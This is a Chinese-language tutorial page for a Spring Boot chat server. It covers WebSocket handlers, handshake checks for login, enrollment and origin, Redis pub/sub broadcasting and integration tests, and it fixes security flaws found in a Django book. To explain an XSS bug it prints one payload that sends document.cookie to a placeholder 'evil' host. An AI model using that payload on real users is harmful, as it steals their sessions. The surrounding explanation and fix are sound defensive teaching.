@@ -1,0 +1,465 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Spring Boot 版第 16 章 · 聊天服务器 — Django 5 实战笔记</title>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body data-book="spring" data-chapter="16">
+<div id="app">
+<aside id="sidebar"></aside>
+<main>
+
+<span class="chapter-eyebrow">Spring Boot 版 · 第 16 章 · 项目四：在线学习平台</span>
+<h1>聊天服务器</h1>
+<p class="lede">
+  每门课程有一个聊天室，选了课的学生可以实时交流。实时推送需要 WebSocket：浏览器和服务器之间保持一条长连接，双方随时发消息。
+  Django 是同步的 WSGI 框架，书中为此引入了 Channels（换成 ASGI 服务器 Daphne、写异步消费者、用 Redis 通道层在进程间广播）。
+  Spring Boot 的内嵌 Tomcat 本来就支持 WebSocket，<strong>同一个端口、同一个进程</strong>，处理消息的代码也是普通的同步代码。
+  这一章的重点是：WebSocket 处理器的生命周期、用 Redis 发布/订阅实现“通道层”，以及书中遗漏的三个安全问题。
+</p>
+
+<div class="goals">
+  <h4>本章目标</h4>
+  <ul>
+    <li>用 <code>TextWebSocketHandler</code> 实现聊天消费者；理解连接、消息、断开三个回调</li>
+    <li>在握手阶段检查登录和选课（书中没有），并理解同源检查</li>
+    <li>用 Redis 发布/订阅在多个应用实例之间广播消息（≈ <code>channels_redis</code>）</li>
+    <li>保存聊天记录，页面打开时显示最近 5 条</li>
+    <li>修复前端用 <code>innerHTML</code> 拼接消息导致的 XSS</li>
+    <li>用真实的 WebSocket 客户端写集成测试</li>
+  </ul>
+</div>
+
+<p>对应的 Django 讲解见 <a href="ch16.html">Django 版第 16 章</a>；本章代码在 <code>springboot/Chapter16/</code>。</p>
+
+<div id="chapter-toc"></div>
+
+<h2 id="overview">全景：一条消息的旅程</h2>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 300" role="img" aria-label="学生 A 的浏览器通过 WebSocket 发送消息，应用实例 1 的 ChatWebSocketHandler 保存消息到数据库，再发布到 Redis 频道 chat:room:7；应用实例 1 和实例 2 都订阅了 chat:room:*，收到后分别把消息推送给本机连接在房间 7 的浏览器 A、B 和 C">
+  <rect class="bx" x="10" y="30" width="120" height="50" rx="10"/>
+  <text class="ttl" x="70" y="60" text-anchor="middle">浏览器 A</text>
+  <rect class="bx" x="10" y="110" width="120" height="50" rx="10"/>
+  <text class="ttl" x="70" y="140" text-anchor="middle">浏览器 B</text>
+  <rect class="bx" x="10" y="220" width="120" height="50" rx="10"/>
+  <text class="ttl" x="70" y="250" text-anchor="middle">浏览器 C</text>
+
+  <rect class="bx-b" x="190" y="20" width="220" height="150" rx="12"/>
+  <text class="ttl on-b" x="300" y="44" text-anchor="middle">应用实例 1</text>
+  <rect class="bx" x="205" y="58" width="190" height="44" rx="8"/>
+  <text class="mono sm" x="300" y="85" text-anchor="middle">ChatWebSocketHandler</text>
+  <rect class="bx" x="205" y="112" width="190" height="44" rx="8"/>
+  <text class="mono sm" x="300" y="132" text-anchor="middle">ChatRooms</text>
+  <text class="sm" x="300" y="148" text-anchor="middle">房间 7：A、B</text>
+
+  <rect class="bx-b" x="190" y="200" width="220" height="86" rx="12"/>
+  <text class="ttl on-b" x="300" y="224" text-anchor="middle">应用实例 2</text>
+  <rect class="bx" x="205" y="236" width="190" height="40" rx="8"/>
+  <text class="sm" x="300" y="261" text-anchor="middle">ChatRooms · 房间 7：C</text>
+
+  <rect class="bx-a" x="480" y="100" width="130" height="70" rx="10"/>
+  <text class="ttl on-a" x="545" y="126" text-anchor="middle">Redis</text>
+  <text class="mono sm" x="545" y="146" text-anchor="middle">chat:room:7</text>
+  <text class="sm" x="545" y="162" text-anchor="middle">发布 / 订阅</text>
+
+  <rect class="bx-g" x="630" y="20" width="120" height="50" rx="10"/>
+  <text class="ttl on-g" x="690" y="42" text-anchor="middle">数据库</text>
+  <text class="mono sm" x="690" y="60" text-anchor="middle">chat_message</text>
+
+  <path class="ln" d="M132 42 H201" marker-end="url(#ar)"/>
+  <text class="sm" x="166" y="35" text-anchor="middle">① 发送</text>
+  <path class="ln-g" d="M397 70 H560 V45 H626" marker-end="url(#ar-g)"/>
+  <text class="sm on-g" x="480" y="62" text-anchor="middle">② 保存</text>
+  <path class="ln-a" d="M397 90 H545 V96" marker-end="url(#ar-a)"/>
+  <text class="sm on-a" x="455" y="84" text-anchor="middle">③ 发布</text>
+  <path class="ln-a" d="M478 140 H399" marker-end="url(#ar-a)"/>
+  <path class="ln-a" d="M545 172 V256 H399" marker-end="url(#ar-a)"/>
+  <text class="sm on-a" x="580" y="220">④ 订阅者收到</text>
+  <path class="ln-p" d="M203 128 H160 V68 H134" marker-end="url(#ar-p)"/>
+  <path class="ln-p" d="M160 128 V135 H134" marker-end="url(#ar-p)"/>
+  <path class="ln-p" d="M203 256 H160 V245 H134" marker-end="url(#ar-p)"/>
+  <text class="sm on-p" x="150" y="195" text-anchor="middle">⑤ 推送</text>
+</svg>
+<figcaption>图 S16-1　消息先保存、再经 Redis 广播；每个实例只负责推送给连在自己身上的浏览器</figcaption>
+</figure>
+
+<h2 id="setup">不需要换服务器</h2>
+
+<div class="tw">
+<table>
+  <tr><th>Django + Channels</th><th>Spring Boot</th></tr>
+  <tr><td>安装 channels、daphne；<code>INSTALLED_APPS</code> 加 <code>'daphne'</code></td><td>加 <code>spring-boot-starter-websocket</code></td></tr>
+  <tr><td><code>ASGI_APPLICATION</code>、<code>asgi.py</code> 的 <code>ProtocolTypeRouter</code></td><td><code>@EnableWebSocket</code> + <code>WebSocketConfigurer</code></td></tr>
+  <tr><td><code>routing.py</code>：<code>re_path(r'ws/chat/room/(?P&lt;course_id&gt;\d+)/$', ...)</code></td><td><code>registry.addHandler(handler, "/ws/chat/room/*/")</code></td></tr>
+  <tr><td><code>AuthMiddlewareStack</code>（把会话里的用户放进 <code>scope</code>）</td><td>握手请求照常经过 Spring Security；<code>HandshakeInterceptor</code> 读取已认证的用户</td></tr>
+  <tr><td><code>AsyncWebsocketConsumer</code></td><td><code>TextWebSocketHandler</code></td></tr>
+  <tr><td>通道层 <code>RedisChannelLayer</code>（<code>group_add</code>/<code>group_send</code>）</td><td>自己维护房间 → 连接的映射 + Redis 发布/订阅</td></tr>
+  <tr><td>生产环境：uWSGI 处理 HTTP，Daphne 处理 WebSocket，Nginx 分流</td><td>一个进程同时处理两者（第 17 章）</td></tr>
+</table>
+</div>
+
+<p>
+  Spring 还提供了一套更高层的方案：STOMP 子协议 + 消息代理（<code>@MessageMapping</code>、<code>SimpMessagingTemplate</code>），适合“订阅主题”式的复杂场景。
+  这个聊天室的协议非常简单（发一个 JSON，收一个 JSON），和书中一样用原生 WebSocket 更直观，前端也不需要 STOMP 客户端库。
+</p>
+
+<h2 id="consumer">消费者 → WebSocketHandler</h2>
+
+<div class="vs">
+  <div class="dj"><div class="h">Django · consumers.py</div>
+<div class="code" data-lang="python"><pre>
+class ChatConsumer(AsyncWebsocketConsumer):
+    async def connect(self):
+        self.user = self.scope['user']
+        self.id = self.scope['url_route']['kwargs']['course_id']
+        self.room_group_name = f'chat_{self.id}'
+        await self.channel_layer.group_add(
+            self.room_group_name, self.channel_name)
+        await self.accept()
+
+    async def disconnect(self, close_code):
+        await self.channel_layer.group_discard(
+            self.room_group_name, self.channel_name)
+
+    async def receive(self, text_data):
+        message = json.loads(text_data)['message']
+        now = timezone.now()
+        await self.channel_layer.group_send(
+            self.room_group_name,
+            {'type': 'chat_message', 'message': message,
+             'user': self.user.username,
+             'datetime': now.isoformat()})
+        await self.persist_message(message)
+
+    async def chat_message(self, event):
+        await self.send(text_data=json.dumps(event))
+</pre></div></div>
+  <div class="sb"><div class="h">Spring · ChatWebSocketHandler.java</div>
+<div class="code" data-lang="java"><pre>
+@Component
+public class ChatWebSocketHandler extends TextWebSocketHandler {
+
+    @Override
+    public void afterConnectionEstablished(WebSocketSession session) {
+        rooms.join(courseId(session), session);          // group_add
+    }
+
+    @Override
+    public void afterConnectionClosed(WebSocketSession session,
+                                      CloseStatus status) {
+        rooms.leave(courseId(session), session);         // group_discard
+    }
+
+    @Override
+    protected void handleTextMessage(WebSocketSession session,
+                                     TextMessage text) throws Exception {
+        String message;
+        try {
+            message = json.readTree(text.getPayload())
+                    .path("message").asString("");
+        } catch (JacksonException e) {
+            session.close(CloseStatus.BAD_DATA);         // 1007
+            return;
+        }
+        if (message.isBlank() || message.length() &gt; MAX_LENGTH) return;
+        Message saved = chat.save(courseId(session), userId(session), message);
+        rooms.publish(ChatEvent.chatMessage(courseId(session), message,
+                username(session), saved.getSentOn())); // group_send
+    }
+}
+</pre></div></div>
+</div>
+
+<ul>
+  <li><strong>同步还是异步</strong>：Channels 的消费者是 <code>async</code> 的，访问数据库要用 <code>acreate()</code> 或 <code>database_sync_to_async</code>。Spring 在线程池的线程上调用处理器，直接调用普通的 JPA 服务即可。（Java 21 的虚拟线程让这种写法在高并发下也很便宜：<code>spring.threads.virtual.enabled=true</code>。）</li>
+  <li><strong>先保存再广播</strong>：书中先 <code>group_send</code> 再保存，实时消息的时间是 <code>timezone.now()</code>，数据库里是 <code>auto_now_add</code> 的时间，两者略有差别。这里先保存，广播的时间就是数据库里的时间，刷新页面后显示的一致。</li>
+  <li><strong>输入校验</strong>：非 JSON 直接关闭连接（1007 Bad Data）；空消息忽略；长度限制 2000（书中没有限制）。</li>
+</ul>
+
+<h2 id="handshake">握手：登录、选课、同源</h2>
+
+<p>
+  WebSocket 连接以一个普通的 HTTP GET 请求开始（带 <code>Upgrade: websocket</code> 头），服务器回 101 才切换协议。
+  这个握手请求会经过 Spring Security 的过滤器链，所以会话 cookie 已经被认证过了。我们在 <code>HandshakeInterceptor</code> 里做业务检查：
+</p>
+
+<div class="code" data-lang="java" data-file="ChatHandshakeInterceptor.java（节选）">
+<pre>
+@Override
+public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response,
+                               WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes) {
+    Matcher matcher = ROOM.matcher(request.getURI().getPath());       // /ws/chat/room/(\d+)/
+    if (!matcher.matches()
+            || !(request.getPrincipal() instanceof Authentication auth)
+            || !(auth.getPrincipal() instanceof CurrentUser user)) {
+        response.setStatusCode(HttpStatus.FORBIDDEN);
+        return false;
+    }
+    long courseId = Long.parseLong(matcher.group(1));
+    if (!chat.isEnrolled(courseId, user.id())) {                      // 书中没有这一步
+        response.setStatusCode(HttpStatus.FORBIDDEN);
+        return false;
+    }
+    // ≈ self.scope['user'] 和 self.scope['url_route']['kwargs']['course_id']
+    attributes.put("courseId", courseId);
+    attributes.put("userId", user.id());
+    attributes.put("username", user.getUsername());
+    return true;
+}
+</pre>
+</div>
+
+<div class="box warn">
+  <div class="t">&#9888; 书中的三个安全问题</div>
+  <ol>
+    <li><strong>不检查选课</strong>：<code>course_chat_room</code> 视图检查了“是否选了这门课”，但 WebSocket 的 <code>connect()</code> 什么都不检查就 <code>accept()</code>。任何登录用户改一下地址里的课程 id，就能进入任何聊天室、读到所有消息、以自己的名义发言。</li>
+    <li><strong>不检查登录</strong>：匿名用户也能连上，<code>self.user</code> 是 <code>AnonymousUser</code>，发消息时保存到数据库失败。这里在 URL 规则里要求 <code>/ws/**</code> 登录，未登录的握手直接返回 401。</li>
+    <li><strong>不检查来源</strong>：浏览器发起 WebSocket 连接时会带上 cookie，但<strong>不受同源策略限制</strong>。书中没有用 Channels 的 <code>AllowedHostsOriginValidator</code>，恶意网站的页面可以用访客的登录状态连上聊天室（跨站 WebSocket 劫持）。Spring 注册处理器时如果不调用 <code>setAllowedOrigins(...)</code>，默认<strong>只接受同源</strong>请求（检查 <code>Origin</code> 头），这个问题自动避免了。</li>
+  </ol>
+</div>
+
+<p>
+  未登录时为什么返回 401 而不是重定向？网页请求被重定向到登录页是合理的，但 WebSocket 客户端不会跟随重定向去登录。
+  在 Security 配置里给 <code>/ws/**</code> 单独指定一个入口点：
+</p>
+
+<div class="code" data-lang="java">
+<pre>
+.exceptionHandling(ex -&gt; ex
+        .defaultAuthenticationEntryPointFor(new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED),
+                PathPatternRequestMatcher.withDefaults().matcher("/ws/**"))
+        .defaultAuthenticationEntryPointFor(new LoginUrlAuthenticationEntryPoint("/accounts/login/"),
+                AnyRequestMatcher.INSTANCE))
+</pre>
+</div>
+
+<p>
+  注意第二行不能省：一旦注册了任何“默认入口点”，表单登录自带的入口点就只对浏览器发的 HTML 请求生效了（它按 <code>Accept</code> 头匹配），
+  其他请求会落到第一个注册的入口点上 —— 第一版漏了这一行，测试里所有“未登录重定向到登录页”的断言都变成了 401。
+</p>
+
+<h2 id="rooms">通道层：房间 + Redis 发布/订阅</h2>
+
+<p>
+  Channels 的通道层做两件事：记录每个组（房间）里有哪些连接；把 <code>group_send</code> 的消息送到这些连接 —— 即使它们在别的进程里。
+  前者用一个并发 Map 就能实现；后者用 Redis 的发布/订阅：每个应用实例订阅 <code>chat:room:*</code>，发消息时发布到 <code>chat:room:&lt;课程 id&gt;</code>。
+</p>
+
+<div class="code" data-lang="java" data-file="ChatRooms.java（节选）">
+<pre>
+@Component
+public class ChatRooms implements MessageListener {
+
+    /** 课程 id → (会话 id → 会话) */
+    private final Map&lt;Long, Map&lt;String, WebSocketSession&gt;&gt; rooms = new ConcurrentHashMap&lt;&gt;();
+
+    public void join(long courseId, WebSocketSession session) {
+        // sendMessage 不是线程安全的：包一层，串行发送，并限制发送超时（5 秒）和缓冲（64 KB）
+        rooms.computeIfAbsent(courseId, id -&gt; new ConcurrentHashMap&lt;&gt;())
+             .put(session.getId(), new ConcurrentWebSocketSessionDecorator(session, 5_000, 64 * 1024));
+    }
+
+    public void publish(ChatEvent event) {
+        redis.convertAndSend("chat:room:" + event.courseId(), json.writeValueAsString(event));
+    }
+
+    /** Redis 订阅回调 ≈ consumer.chat_message(event)：原样推给本机房间里的连接 */
+    @Override
+    public void onMessage(org.springframework.data.redis.connection.Message message, byte[] pattern) {
+        long courseId = ...;   // 从频道名解析
+        TextMessage text = new TextMessage(new String(message.getBody(), UTF_8));
+        rooms.getOrDefault(courseId, Map.of()).values().forEach(s -&gt; s.sendMessage(text));
+    }
+}
+
+// ChatConfig
+@Bean
+RedisMessageListenerContainer chatListenerContainer(RedisConnectionFactory cf, ChatRooms rooms) {
+    RedisMessageListenerContainer container = new RedisMessageListenerContainer();
+    container.setConnectionFactory(cf);
+    container.addMessageListener(rooms, new PatternTopic("chat:room:*"));
+    return container;
+}
+</pre>
+</div>
+
+<ul>
+  <li><strong>为什么要包 <code>ConcurrentWebSocketSessionDecorator</code></strong>：两个学生同时发言，两个线程会同时向同一个连接写数据，底层的 WebSocket 实现会抛 <code>IllegalStateException</code>。装饰器把发送排成队；某个客户端网络很慢时，超过时间或缓冲上限就断开它，而不是拖住发送线程。</li>
+  <li><strong>只部署一个实例时</strong>，Redis 看起来是多余的（直接遍历本机的连接就行）。但写成发布/订阅之后，扩容到多个实例时代码一行不用改 —— 这正是书中配置 <code>channels_redis</code> 的原因。</li>
+  <li>Redis 的发布/订阅<strong>不持久化</strong>：没有订阅者时消息就丢了。这对聊天室没问题（消息已经存进数据库）；需要可靠投递时应该用 Redis Streams 或消息队列。</li>
+</ul>
+
+<h2 id="history">聊天记录</h2>
+
+<div class="vs">
+  <div class="dj"><div class="h">Django · views.py</div>
+<div class="code" data-lang="python"><pre>
+@login_required
+def course_chat_room(request, course_id):
+    try:
+        course = request.user.courses_joined.get(id=course_id)
+    except Course.DoesNotExist:
+        return HttpResponseForbidden()
+    latest_messages = course.chat_messages.select_related(
+        'user').order_by('-id')[:5]
+    latest_messages = reversed(latest_messages)
+    return render(request, 'chat/room.html', {...})
+</pre></div></div>
+  <div class="sb"><div class="h">Spring · MessageRepository + ChatService</div>
+<div class="code" data-lang="java"><pre>
+@EntityGraph(attributePaths = "user")
+List&lt;Message&gt; findByCourseIdOrderByIdDesc(Long courseId, Limit limit);
+
+public List&lt;Message&gt; latestMessages(Long courseId) {
+    return messages.findByCourseIdOrderByIdDesc(courseId, Limit.of(5))
+            .reversed();          // Java 21 的 SequencedCollection
+}
+</pre></div></div>
+</div>
+
+<p>
+  <code>Limit.of(5)</code> 是 Spring Data 3.2 起的写法（≈ 切片 <code>[:5]</code>）；<code>List.reversed()</code> 是 Java 21 新增的，和 Python 的 <code>reversed()</code> 一样返回反向视图。
+  消息表的外键用 <code>on_delete=PROTECT</code> 的语义：迁移脚本里外键不带 <code>ON DELETE CASCADE</code>，有聊天记录的用户和课程不能被直接删除。
+</p>
+
+<h2 id="frontend">前端：别用 innerHTML 拼接消息</h2>
+
+<div class="vs">
+  <div class="dj"><div class="h">Django 书 · room.html</div>
+<div class="code" data-lang="js"><pre>
+chat.innerHTML += '&lt;div class="message ' + source + '"&gt;' +
+                  '&lt;strong&gt;' + name + '&lt;/strong&gt; ' +
+                  '&lt;span class="date"&gt;' + datetime + '&lt;/span&gt;&lt;br&gt;' +
+                  data.message + '&lt;/div&gt;';
+</pre></div></div>
+  <div class="sb"><div class="h">Spring 版 · room.html</div>
+<div class="code" data-lang="js"><pre>
+const div = document.createElement('div');
+div.className = 'message ' + (isMe ? 'me' : 'other');
+const name = document.createElement('strong');
+name.textContent = isMe ? 'Me' : data.user;
+const date = document.createElement('span');
+date.className = 'date';
+date.textContent = datetime;
+div.append(name, ' ', date,
+           document.createElement('br'), data.message);
+chat.appendChild(div);
+</pre></div></div>
+</div>
+
+<p>
+  书中把别人发来的消息直接拼进 HTML：任何学生发一条 <code>&lt;img src=x onerror="fetch('https://evil/?c='+document.cookie)"&gt;</code>，
+  房间里<strong>所有人</strong>的浏览器都会执行这段脚本。服务端模板里的历史消息由 Django 自动转义，所以只有实时消息有问题 —— 很容易在测试时漏掉。
+  改为逐个创建元素，用户输入只通过 <code>textContent</code> / <code>append(字符串)</code> 写入，浏览器永远把它当作纯文本。
+</p>
+
+<ul>
+  <li><strong>页面变量</strong>：书中用 <code>json_script</code> 过滤器把课程 id 和用户名安全地放进页面；Thymeleaf 的 JavaScript 内联模式做同样的事：<code>const requestUser = /*[[${#authentication.name}]]*/ 'user';</code> 会输出正确转义的 JS 字符串字面量。</li>
+  <li><strong>协议</strong>：书中写死了 <code>'ws://'</code>（第 17 章改成 <code>'wss://'</code>）；这里按页面协议选择，开发和生产用同一份模板。</li>
+</ul>
+
+<h2 id="tests">测试</h2>
+
+<p>
+  Channels 提供 <code>WebsocketCommunicator</code> 在进程内测试消费者。Spring 这边最可靠的做法是启动真正的服务器（随机端口），
+  先用 <code>HttpClient</code> 走一遍表单登录拿到会话 cookie，再用 <code>StandardWebSocketClient</code> 带着 cookie 连接：
+</p>
+
+<div class="code" data-lang="java" data-file="ChatWebSocketTests.java（节选）">
+<pre>
+@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
+class ChatWebSocketTests {
+
+    @Test
+    void messagesAreBroadcastToEveryoneInTheRoomAndPersisted() throws Exception {
+        Client alice = connect(login("ws-alice"), base("http"));
+        Client bob = connect(login("ws-bob"), null);
+        await().atMost(Duration.ofSeconds(5)).until(() -&gt; rooms.size(course.getId()) == 2);
+
+        alice.session().sendMessage(new TextMessage("{\"message\": \"&lt;b&gt;hi&lt;/b&gt; bob\"}"));
+
+        for (Client client : new Client[] {alice, bob}) {
+            JsonNode event = json.readTree(client.inbox().poll(5, TimeUnit.SECONDS));
+            assertThat(event.get("message").asString()).isEqualTo("&lt;b&gt;hi&lt;/b&gt; bob");   // 原样传递
+            assertThat(event.get("user").asString()).isEqualTo("ws-alice");
+        }
+        assertThat(messages.findAll()).extracting(Message::getContent).containsExactly("&lt;b&gt;hi&lt;/b&gt; bob");
+    }
+
+    @Test
+    void handshakeIsRejectedForStrangersAnonymousUsersAndForeignOrigins() throws Exception {
+        assertThatThrownBy(() -&gt; connect(login("ws-carol"), null)).hasStackTraceContaining("403");  // 没选课
+        assertThatThrownBy(() -&gt; connect(null, null)).hasStackTraceContaining("401");               // 未登录
+        assertThatThrownBy(() -&gt; connect(login("ws-alice"), "http://evil.example"))
+                .hasStackTraceContaining("403");                                                  // 跨站
+    }
+}
+</pre>
+</div>
+
+<p>
+  本章新增 6 个测试（共 47 个）：聊天室页面（未登录、未选课 403、最近 5 条按时间正序且转义、页面变量）、课程页链接，
+  以及三个真实 WebSocket 测试（广播与保存、空消息忽略、非 JSON 关闭连接 1007、陌生人/匿名/跨站握手被拒绝）。
+  等待异步结果用 Awaitility，而不是 <code>Thread.sleep</code>。
+</p>
+
+<h2 id="review">差异点评</h2>
+
+<div class="review">
+  <div class="h">&#128269; 第 16 章 Spring 版点评 <small>springboot/Chapter16</small></div>
+
+  <div class="item">
+    <h4><span class="tag good">做得好</span> 握手阶段完成全部授权检查</h4>
+    <p>登录、选课、同源三项检查都在连接建立之前完成，被拒绝的连接根本不会进入房间；测试覆盖了每一种拒绝。</p>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag good">做得好</span> 修复了实时消息的 XSS</h4>
+    <p>服务端存的、传的都是原始文本，只在显示时作为文本插入 DOM —— “输出时按上下文转义”是防 XSS 的根本原则。</p>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag warn">注意</span> 退课后连接仍然有效</h4>
+    <p>检查只发生在握手时。学生退课（或被删除）后，已经建立的连接还能继续收发消息，直到断开。要严格控制，可以在 <code>handleTextMessage</code> 里再检查一次，或者退课时主动关闭该用户的连接。</p>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag warn">注意</span> 会话过期不影响 WebSocket</h4>
+    <p>WebSocket 连接建立后不再发送 HTTP 请求，HTTP 会话可能在聊天过程中过期，而连接仍然保持认证状态。这在大多数聊天场景可以接受；Spring Session 提供了在 WebSocket 消息时刷新会话的支持。</p>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag info">补充知识</span> 什么时候该用 STOMP</h4>
+    <p>需要“订阅多个主题”“给某个用户单独推送”“消息确认”，或者想接入 RabbitMQ 这类外部消息代理时，STOMP + <code>@MessageMapping</code> 能省很多代码；前端要配合使用 stomp.js。</p>
+  </div>
+</div>
+
+<h2 id="summary">小结</h2>
+
+<ul>
+  <li>Spring Boot 不需要换服务器：<code>@EnableWebSocket</code> + <code>TextWebSocketHandler</code>，处理代码是普通的同步代码。</li>
+  <li>握手是 HTTP 请求：Security 先认证，<code>HandshakeInterceptor</code> 再做业务授权；默认只允许同源。</li>
+  <li>通道层 = 本机房间表 + Redis 发布/订阅；向连接发送要用并发安全的装饰器。</li>
+  <li>先保存再广播；前端用 <code>textContent</code> 显示用户输入。</li>
+  <li>用真实服务器 + WebSocket 客户端做集成测试，用 Awaitility 等待异步结果。</li>
+</ul>
+
+<div class="exercise">
+  <h3>动手练习</h3>
+  <ol>
+    <li>显示“当前在线人数”：用户加入和离开时向房间广播一条系统消息（多实例时人数要怎么统计？）。</li>
+    <li>退课时关闭该用户在这门课聊天室里的所有连接。</li>
+    <li>打开 <code>spring.threads.virtual.enabled=true</code>，用一个小程序同时建立 1000 个连接，观察线程数的变化。</li>
+    <li>用 STOMP 重写聊天室，比较前后端代码量。</li>
+  </ol>
+</div>
+
+<div id="pager"></div>
+</main>
+</div>
+<script src="assets/site.js"></script>
+</body>
+</html>
